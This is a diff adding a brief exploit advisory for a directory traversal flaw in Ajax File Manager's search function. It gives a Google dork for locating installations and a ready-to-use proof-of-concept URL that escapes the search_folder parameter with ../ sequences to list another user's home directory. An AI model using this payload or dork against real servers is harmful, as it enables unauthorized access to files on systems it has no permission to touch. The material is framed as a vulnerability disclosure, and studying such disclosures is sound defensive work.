@@ -1,0 +1,20 @@
+# Exploit Title: Ajax File Manager  DirectoryTraversal
+# Google Dork: inurl: "plugins/ajaxfilemanager"
+# Date: 03/07/2014
+# Exploit Author: Eduardo Alves (edudx9)
+# Vendor Homepage: phpletter.com
+# Software Link: http://phpletter.com/Demo/Ajax-File--Manager/
+# Version: [app version - All
+# Tested on: Windows/Linux
+
+
+Ajax File/Image Manager is a l tool  to manager files and images remotely.
+Without extra configs, it's possible to list files from another directory.
+
+The vulnerability it's related to "search" function"
+
+In "search_folder" parameter, escape with ../  or  ..%2f
+
+PoF:
+
+http://SERVER/PATH/ajaxfilemanager/ajax_get_file_listing.php?limit=10&view=thumbnail&search=1&search_name=&search_recursively=0&search_mtime_from=&search_mtime_to=&search_folder=../../../../../../../../home/phungv93/public_html/
